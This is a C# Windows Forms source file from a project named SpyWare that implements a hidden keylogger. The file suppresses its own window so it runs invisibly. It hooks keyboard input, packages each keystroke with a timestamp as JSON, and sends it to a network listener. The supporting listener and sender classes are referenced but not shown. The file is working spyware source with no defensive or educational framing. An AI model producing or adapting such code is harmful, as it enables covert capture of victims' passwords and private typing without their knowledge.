using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SpyWare
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            
        }
        protected override void SetVisibleCore(bool value)
        {
            base.SetVisibleCore(false);
            StartSniffer();
        }
        public void StartSniffer()
        {
            KeyboardListener keyboardListener = new KeyboardListener();
            NetworkSender networkSender = new NetworkSender("127.0.0.1", 1488);
            keyboardListener.KeyDown += (a, b) =>
            {
                KeyBoardInteractionInfo kbii = new KeyBoardInteractionInfo();
                kbii.Key = b.Key.ToString();
                kbii.Value = b.ToString();
                kbii.TimePressed = DateTime.Now.ToShortTimeString();
                networkSender.SendInJSON(kbii);
            };
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
